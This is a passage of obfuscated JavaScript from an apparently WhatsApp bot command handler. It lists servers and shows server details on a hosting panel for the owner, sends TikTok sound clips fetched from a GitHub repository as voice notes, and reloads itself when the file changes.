            }
          });
          let _0x21e731 = await _0x27e298.json();
          if (_0x21e731.errors) {
            return _0x385943(util.format(_0x21e731.errors[0x0]));
          }
          let _0x161269 = _0x21e731.attributes;
          let _0x1c63fa = "▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n" + _0x161269.name.toUpperCase() + " SERVER DETAILS\n\n● ID: " + _0x161269.id + "\n● NAME: " + _0x161269.name + "\n● MEMORY: " + (_0x161269.limits.memory === 0x0 ? "Unlimited MB" : _0x161269.limits.memory + 'MB') + "\n● DISK: " + (_0x161269.limits.disk === 0x0 ? "Unlimited MB" : _0x161269.limits.disk + 'MB') + "\n● CPU: " + (_0x161269.limits.cpu === 0x0 ? "Unlimited %" : _0x161269.limits.cpu + '%') + "\n● DESKRIPSI: " + _0x161269.description + "\n● CREATED AT: \n " + _0x161269.created_at + "\n ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0x385943(_0x1c63fa);
        }
        break;
      case "listsrv":
        {
          if (!_0x107eff) {
            return _0x385943("*This feature can only be used by the owner/Dev*");
          }
          let _0x5d9b30 = q ? q : '1';
          let _0x3d3c06 = await fetch(global.domain + '/api/application/servers?page=' + _0x5d9b30, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            }
          });
          let _0x52595b = await _0x3d3c06.json();
          if (_0x52595b.errors) {
            return _0x385943(util.format(_0x52595b.errors[0x0]));
          }
          let _0x555350 = _0x52595b.data;
          let _0x578be5 = [];
          for (let _0x83e2ac of _0x555350) {
            let _0x284081 = _0x83e2ac.attributes;
            let _0x2d9906 = {
              'id': _0x284081.id,
              'name': _0x284081.name.toLowerCase(),
              'memory': _0x284081.limits.memory,
              'disk': _0x284081.limits.disk,
              'cpu': _0x284081.limits.cpu
            };
            await _0x578be5.push(_0x2d9906);
          }
          _0x385943(util.format(_0x578be5));
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case 'sound20':
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case 'sound28':
      case "sound29":
      case "sound30":
      case 'sound31':
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case 'sound38':
      case 'sound39':
      case 'sound40':
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case 'sound46':
      case "sound47":
      case 'sound48':
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case 'sound54':
      case "sound55":
      case 'sound56':
      case "sound57":
      case "sound58":
      case 'sound59':
      case "sound60":
      case "sound61":
      case "sound62":
      case 'sound63':
      case "sound64":
      case 'sound65':
      case 'sound66':
      case "sound67":
      case 'sound68':
      case "sound69":
      case "sound70":
      case 'sound71':
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case 'sound76':
      case "sound77":
      case 'sound78':
      case "sound79":
      case 'sound80':
      case "sound81":
      case 'sound82':
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case 'sound90':
      case 'sound91':
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case 'sound96':
      case "sound97":
      case 'sound98':
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case 'sound106':
      case "sound107":
      case 'sound108':
      case "sound109":
      case "sound110":
      case "sound111":
      case 'sound112':
      case "sound113":
      case 'sound114':
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case 'sound128':
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case 'sound133':
      case 'sound134':
      case 'sound135':
      case "sound136":
      case "sound137":
      case "sound138":
      case 'sound139':
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case 'sound146':
      case "sound147":
      case "sound148":
      case "sound149":
      case 'sound150':
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        {
          if (!_0x107eff && !_0x20c9ce && !_0x347b7b && !_0x254696) {
            return;
          }
          strava_dev = await getBuffer("https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/" + _0x55733f + ".mp3");
          _0x4e2417.sendMessage(_0x477074, {
            'audio': strava_dev,
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x315745
          });
        }
        break;
      default:
    }
  } catch (_0x20fbe1) {
    froom = _0x315745.key.remoteJid;
    stravaRorr = async () => {
      _0x4e2417.sendMessage(froom, {
        'text': util.format(_0x20fbe1)
      });
    };
    stravaRorr();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});